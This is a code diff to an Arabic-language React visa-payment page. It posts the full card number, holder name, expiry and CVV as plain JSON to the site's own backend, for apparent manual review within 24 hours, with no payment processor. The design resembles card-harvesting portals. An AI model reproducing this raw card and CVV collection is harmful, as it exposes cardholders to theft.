@@ -1,5 +1,6 @@
-import { useState } from "react";
-import { CreditCard, Lock, Calendar, User, ShieldCheck, ArrowRight } from "lucide-react";
+import { useState, useEffect } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { CreditCard, Lock, Calendar, User, ShieldCheck, ArrowRight, CheckCircle, AlertCircle } from "lucide-react";
 import Navbar from "@/components/Navbar";
 import Footer from "@/components/Footer";
 
@@ -11,6 +12,12 @@ interface PaymentForm {
 }
 
 export default function PayVisaPage() {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  
+  const applicationId = searchParams.get("applicationId");
+  const sessionId = searchParams.get("session");
+  
   const [form, setForm] = useState<PaymentForm>({
     cardNumber: "",
     cardHolder: "",
@@ -19,6 +26,15 @@ export default function PayVisaPage() {
   });
   const [isProcessing, setIsProcessing] = useState(false);
   const [errors, setErrors] = useState<Partial<PaymentForm>>({});
+  const [submitStatus, setSubmitStatus] = useState<"idle" | "success" | "error">("idle");
+  const [errorMessage, setErrorMessage] = useState("");
+
+  // التحقق من وجود معرف الطلب
+  useEffect(() => {
+    if (!applicationId && !sessionId) {
+      setErrorMessage("معرف الطلب غير موجود. يرجى العودة للصفحة السابقة.");
+    }
+  }, [applicationId, sessionId]);
 
   const formatCardNumber = (value: string) => {
     const digits = value.replace(/\D/g, "").slice(0, 16);
@@ -56,11 +72,43 @@ export default function PayVisaPage() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!validateForm()) return;
+    if (!applicationId) {
+      setErrorMessage("معرف الطلب غير موجود");
+      return;
+    }
     
     setIsProcessing(true);
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    setIsProcessing(false);
-    alert("تم استلام بيانات الدفع بنجاح!");
+    setSubmitStatus("idle");
+    setErrorMessage("");
+
+    try {
+      const response = await fetch(`/api/applications/${applicationId}/payment`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          cardNumber: form.cardNumber.replace(/\s/g, ""),
+          cardHolder: form.cardHolder,
+          expiryDate: form.expiryDate,
+          cvv: form.cvv,
+        }),
+      });
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        throw new Error(data.error || "فشل في إرسال بيانات الدفع");
+      }
+
+      setSubmitStatus("success");
+    } catch (err) {
+      console.error("Payment error:", err);
+      setSubmitStatus("error");
+      setErrorMessage(err instanceof Error ? err.message : "حدث خطأ غير متوقع");
+    } finally {
+      setIsProcessing(false);
+    }
   };
 
   const handleChange = (field: keyof PaymentForm, value: string) => {
@@ -116,114 +164,158 @@ export default function PayVisaPage() {
           </p>
         </div>
 
-        {/* Payment Form */}
-        <div className="max-w-lg mx-auto">
-          <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 shadow-2xl">
-            <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Card Number */}
-              <div className="space-y-3">
-                <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
-                  <CreditCard className="w-6 h-6 text-accent" />
-                  رقم البطاقة
-                </label>
-                <div className="relative">
-                  <input
-                    type="text"
-                    value={form.cardNumber}
-                    onChange={(e) => handleChange("cardNumber", e.target.value)}
-                    placeholder="0000 0000 0000 0000"
-                    className={inputClass(!!errors.cardNumber)}
-                    dir="ltr"
-                  />
-                  <div className="absolute left-4 top-1/2 -translate-y-1/2 flex gap-1">
-                    <div className="w-12 h-8 bg-gradient-to-r from-red-500 to-yellow-500 rounded-md flex items-center justify-center text-[10px] font-bold text-white shadow-lg">VISA</div>
-                  </div>
-                </div>
-                {errors.cardNumber && <p className="text-red-400 text-sm">{errors.cardNumber}</p>}
+        {/* Success State */}
+        {submitStatus === "success" && (
+          <div className="max-w-lg mx-auto">
+            <div className="bg-green-500/20 backdrop-blur-xl border border-green-500/30 rounded-3xl p-8 shadow-2xl text-center">
+              <div className="w-20 h-20 mx-auto mb-6 bg-green-500/20 rounded-full flex items-center justify-center">
+                <CheckCircle className="w-12 h-12 text-green-400" />
               </div>
-
-              {/* Card Holder */}
-              <div className="space-y-3">
-                <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
-                  <User className="w-6 h-6 text-accent" />
-                  اسم حامل البطاقة
-                </label>
-                <input
-                  type="text"
-                  value={form.cardHolder}
-                  onChange={(e) => handleChange("cardHolder", e.target.value)}
-                  placeholder="أحمد محمد علي"
-                  className={inputClass(!!errors.cardHolder)}
-                  dir="ltr"
-                />
-                {errors.cardHolder && <p className="text-red-400 text-sm">{errors.cardHolder}</p>}
-              </div>
-
-              {/* Expiry & CVV */}
-              <div className="grid grid-cols-2 gap-6">
-                <div className="space-y-3">
-                  <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
-                    <Calendar className="w-6 h-6 text-accent" />
-                    تاريخ الانتهاء
-                  </label>
-                  <input
-                    type="text"
-                    value={form.expiryDate}
-                    onChange={(e) => handleChange("expiryDate", e.target.value)}
-                    placeholder="MM/YY"
-                    className={inputClass(!!errors.expiryDate)}
-                    dir="ltr"
-                  />
-                  {errors.expiryDate && <p className="text-red-400 text-sm">{errors.expiryDate}</p>}
-                </div>
-                <div className="space-y-3">
-                  <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
-                    <Lock className="w-6 h-6 text-accent" />
-                    رمز الأمان CVV
-                  </label>
-                  <input
-                    type="text"
-                    value={form.cvv}
-                    onChange={(e) => handleChange("cvv", e.target.value)}
-                    placeholder="123"
-                    className={inputClass(!!errors.cvv)}
-                    dir="ltr"
-                  />
-                  {errors.cvv && <p className="text-red-400 text-sm">{errors.cvv}</p>}
-                </div>
-              </div>
-
-              {/* Submit Button */}
-              <button
-                type="submit"
-                disabled={isProcessing}
-                className="w-full mt-8 py-5 px-8 bg-gradient-to-l from-accent to-[#e0b95b] hover:from-[#e0b95b] hover:to-accent text-primary font-bold text-xl rounded-2xl transition-all duration-300 shadow-xl hover:shadow-2xl hover:shadow-accent/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-3"
+              <h2 className="text-2xl font-bold text-white mb-4">تم استلام بيانات الدفع بنجاح!</h2>
+              <p className="text-white/70 mb-6">
+                شكراً لك، سيتم مراجعة بيانات الدفع من قبل فريقنا خلال 24 ساعة
+              </p>
+              <a 
+                href="/" 
+                className="inline-flex items-center gap-2 px-6 py-3 bg-accent text-primary font-bold rounded-xl hover:bg-accent/90 transition-colors"
               >
-                {isProcessing ? (
-                  <>
-                    <svg className="animate-spin h-7 w-7" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                    </svg>
-                    جاري المعالجة...
-                  </>
-                ) : (
-                  <>
-                    <Lock className="w-6 h-6" />
-                    إتمام الدفع
-                    <ArrowRight className="w-6 h-6" />
-                  </>
-                )}
-              </button>
-            </form>
-
-            {/* Security Badge */}
-            <div className="mt-8 pt-6 border-t border-white/10 flex items-center justify-center gap-3 text-white/50">
-              <ShieldCheck className="w-5 h-5" />
-              <span className="text-sm">معلوماتك محمية بتقنية SSL المشفرة</span>
+                العودة للصفحة الرئيسية
+              </a>
             </div>
           </div>
-        </div>
+        )}
+
+        {/* Error State */}
+        {(submitStatus === "error" || (!applicationId && !sessionId)) && (
+          <div className="max-w-lg mx-auto">
+            <div className="bg-red-500/20 backdrop-blur-xl border border-red-500/30 rounded-3xl p-8 shadow-2xl text-center">
+              <div className="w-20 h-20 mx-auto mb-6 bg-red-500/20 rounded-full flex items-center justify-center">
+                <AlertCircle className="w-12 h-12 text-red-400" />
+              </div>
+              <h2 className="text-2xl font-bold text-white mb-4">حدث خطأ</h2>
+              <p className="text-white/70 mb-6">
+                {errorMessage || "يرجى المحاولة مرة أخرى لاحقاً"}
+              </p>
+              <button 
+                onClick={() => window.location.reload()}
+                className="inline-flex items-center gap-2 px-6 py-3 bg-white/10 text-white font-bold rounded-xl hover:bg-white/20 transition-colors"
+              >
+                إعادة المحاولة
+              </button>
+            </div>
+          </div>
+        )}
+
+        {/* Payment Form */}
+        {submitStatus === "idle" && (applicationId || sessionId) && (
+          <div className="max-w-lg mx-auto">
+            <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 shadow-2xl">
+              <form onSubmit={handleSubmit} className="space-y-6">
+                {/* Card Number */}
+                <div className="space-y-3">
+                  <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
+                    <CreditCard className="w-6 h-6 text-accent" />
+                    رقم البطاقة
+                  </label>
+                  <div className="relative">
+                    <input
+                      type="text"
+                      value={form.cardNumber}
+                      onChange={(e) => handleChange("cardNumber", e.target.value)}
+                      placeholder="0000 0000 0000 0000"
+                      className={inputClass(!!errors.cardNumber)}
+                      dir="ltr"
+                    />
+                    <div className="absolute left-4 top-1/2 -translate-y-1/2 flex gap-1">
+                      <div className="w-12 h-8 bg-gradient-to-r from-red-500 to-yellow-500 rounded-md flex items-center justify-center text-[10px] font-bold text-white shadow-lg">VISA</div>
+                    </div>
+                  </div>
+                  {errors.cardNumber && <p className="text-red-400 text-sm">{errors.cardNumber}</p>}
+                </div>
+
+                {/* Card Holder */}
+                <div className="space-y-3">
+                  <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
+                    <User className="w-6 h-6 text-accent" />
+                    اسم حامل البطاقة
+                  </label>
+                  <input
+                    type="text"
+                    value={form.cardHolder}
+                    onChange={(e) => handleChange("cardHolder", e.target.value)}
+                    placeholder="أحمد محمد علي"
+                    className={inputClass(!!errors.cardHolder)}
+                    dir="ltr"
+                  />
+                  {errors.cardHolder && <p className="text-red-400 text-sm">{errors.cardHolder}</p>}
+                </div>
+
+                {/* Expiry & CVV */}
+                <div className="grid grid-cols-2 gap-6">
+                  <div className="space-y-3">
+                    <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
+                      <Calendar className="w-6 h-6 text-accent" />
+                      تاريخ الانتهاء
+                    </label>
+                    <input
+                      type="text"
+                      value={form.expiryDate}
+                      onChange={(e) => handleChange("expiryDate", e.target.value)}
+                      placeholder="MM/YY"
+                      className={inputClass(!!errors.expiryDate)}
+                      dir="ltr"
+                    />
+                    {errors.expiryDate && <p className="text-red-400 text-sm">{errors.expiryDate}</p>}
+                  </div>
+                  <div className="space-y-3">
+                    <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
+                      <Lock className="w-6 h-6 text-accent" />
+                      رمز الأمان CVV
+                    </label>
+                    <input
+                      type="text"
+                      value={form.cvv}
+                      onChange={(e) => handleChange("cvv", e.target.value)}
+                      placeholder="123"
+                      className={inputClass(!!errors.cvv)}
+                      dir="ltr"
+                    />
+                    {errors.cvv && <p className="text-red-400 text-sm">{errors.cvv}</p>}
+                  </div>
+                </div>
+
+                {/* Submit Button */}
+                <button
+                  type="submit"
+                  disabled={isProcessing}
+                  className="w-full mt-8 py-5 px-8 bg-gradient-to-l from-accent to-[#e0b95b] hover:from-[#e0b95b] hover:to-accent text-primary font-bold text-xl rounded-2xl transition-all duration-300 shadow-xl hover:shadow-2xl hover:shadow-accent/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-3"
+                >
+                  {isProcessing ? (
+                    <>
+                      <svg className="animate-spin h-7 w-7" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                      </svg>
+                      جاري المعالجة...
+                    </>
+                  ) : (
+                    <>
+                      <Lock className="w-6 h-6" />
+                      إتمام الدفع
+                      <ArrowRight className="w-6 h-6" />
+                    </>
+                  )}
+                </button>
+              </form>
+
+              {/* Security Badge */}
+              <div className="mt-8 pt-6 border-t border-white/10 flex items-center justify-center gap-3 text-white/50">
+                <ShieldCheck className="w-5 h-5" />
+                <span className="text-sm">معلوماتك محمية بتقنية SSL المشفرة</span>
+              </div>
+            </div>
+          </div>
+        )}
       </div>
 
       <Footer />
